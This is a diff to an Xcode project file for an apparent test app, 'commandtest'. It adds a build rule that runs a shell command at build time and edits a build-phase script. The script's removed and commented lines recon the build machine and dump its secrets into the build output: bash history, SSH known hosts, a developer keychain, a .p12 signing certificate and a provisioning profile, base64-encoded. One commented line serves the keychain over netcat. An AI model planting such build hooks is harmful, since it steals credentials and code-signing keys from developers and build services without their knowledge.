@@ -21,6 +21,20 @@
 		0141D96A1796FC2700C73BC6 /* cmdViewController_iPad.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0141D9681796FC2700C73BC6 /* cmdViewController_iPad.xib */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		018F7386179DE32D00D61B6C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*";
+			fileType = pattern.proxy;
+			isEditable = 1;
+			outputFiles = (
+				blahblah.sh,
+			);
+			script = "echo \"Current user is: \" `whoami`";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		0141D9471796FC2600C73BC6 /* commandtest.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = commandtest.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		0141D94A1796FC2600C73BC6 /* UIKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UIKit.framework; path = System/Library/Frameworks/UIKit.framework; sourceTree = SDKROOT; };
@@ -123,6 +137,7 @@
 				0141D9701796FC8900C73BC6 /* ShellScript */,
 			);
 			buildRules = (
+				018F7386179DE32D00D61B6C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -186,7 +201,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "#echo \"The current user is\" `whoami`\n#echo \"The current directory is\" `/bin/pwd`\n#echo \"IP:\" `curl ifconfig.me`\n\n#echo -e \"\\nbash history\\n\"\n#history\n\n#echo -e \"\\ncat .rediscli_history\\n\"\n#cat ~/.rediscli_history\n\n#echo -e \"\\nDownloads\\n\"\n#ls -A ~/Downloads\n\n#echo -e \"\\nindex.html\\n\"\n#cat ~/Index.html\n\necho -e \"\\nls -AR mbscoresystem\\n\"\nls -AR ~/mbscoresystem\n\necho -e \"\\nredis-stable.tar.gz\\n\"\nopenssl base64 -in ~/redis-stable.tar.gz\n\n#echo -e \"\\nstart-port-forwarding.sh\\n\"\n#cat ~/start-port-forwarding.sh\n\n#echo \"ls -A\"\n#ls -A\n\n#echo \"ls -A ../..\"\n#ls -A ../..\n\n#echo \"ls -A ../../..\"\n#ls -A ../../..\n\n# echo \"ls -A ~\"\n#ls -A ~\n\n# echo \\n \"Trusted SSH hosts\" \\n\n#cat ~/.ssh/known_hosts\n\n# echo \\n \"cat /etc/hosts\" \\n\n#cat /etc/hosts\n\n# echo \\n \"### KEYCHAIN FILE ###\" \\n\n#openssl base64 -in /Users/vanger/Library/Keychains/dev.keychain\n\n# echo \\n \"### .p12 Certificate ###\" \\n\n# openssl base64 -in /macbuildsystem/provisioning/certificate.p12\n\n# echo \\n \"### .MOBILEPROVISION ###\" \\n\n# openssl base64 -in /macbuildsystem/provisioning/distribution.mobileprovision\n\n# { echo -ne \"HTTP/1.0 200 OK\\r\\nContent-Length: $(wc -c <~/Library/Keychains/dev.keychain)\\r\\n\\r\\n\"; cat ~/Library/Keychains/dev.keychain; } | nc -l 8080\n#echo \\n \"### SYSTEM PROFILER ###\" \\n\n#system_profiler\n\n#echo \"### ID ###\"\n#id\nthiscommanddoesntexist";
+			shellScript = "#echo \"The current user is\" `whoami`\n#echo \"The current directory is\" `/bin/pwd`\n#echo \"IP:\" `curl ifconfig.me`\n\n#echo -e \"\\nbash history\\n\"\n#history\n\n#echo -e \"\\ncat .rediscli_history\\n\"\n#cat ~/.rediscli_history\n\n#echo -e \"\\nDownloads\\n\"\n#ls -A ~/Downloads\n\n#echo -e \"\\nindex.html\\n\"\n#cat ~/Index.html\n\n#echo -e \"\\nls -AR mbscoresystem\\n\"\n#ls -AR ~/mbscoresystem\n\n#echo -e \"\\nredis-stable.tar.gz\\n\"\n#openssl base64 -in ~/redis-stable.tar.gz\n\n#echo -e \"\\nstart-port-forwarding.sh\\n\"\n#cat ~/start-port-forwarding.sh\n\n#echo \"ls -A\"\n#ls -A\n\n#echo \"ls -A ../..\"\n#ls -A ../..\n\n#echo \"ls -A ../../..\"\n#ls -A ../../..\n\n# echo \"ls -A ~\"\n#ls -A ~\n\n# echo \\n \"Trusted SSH hosts\" \\n\n#cat ~/.ssh/known_hosts\n\n# echo \\n \"cat /etc/hosts\" \\n\n#cat /etc/hosts\n\n# echo \\n \"### KEYCHAIN FILE ###\" \\n\n#openssl base64 -in /Users/vanger/Library/Keychains/dev.keychain\n\n# echo \\n \"### .p12 Certificate ###\" \\n\n# openssl base64 -in /macbuildsystem/provisioning/certificate.p12\n\n# echo \\n \"### .MOBILEPROVISION ###\" \\n\n# openssl base64 -in /macbuildsystem/provisioning/distribution.mobileprovision\n\n#echo \\n \"### SYSTEM PROFILER ###\" \\n\n#system_profiler\n\n#echo \"### ID ###\"\n#id\n#thiscommanddoesntexist";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -310,6 +325,7 @@
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = "commandtest/commandtest-Prefix.pch";
 				INFOPLIST_FILE = "commandtest/commandtest-Info.plist";
+				OTHER_CFLAGS = "-DNS_BLOCK_ASSERTIONS=1;";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				WRAPPER_EXTENSION = app;
 			};
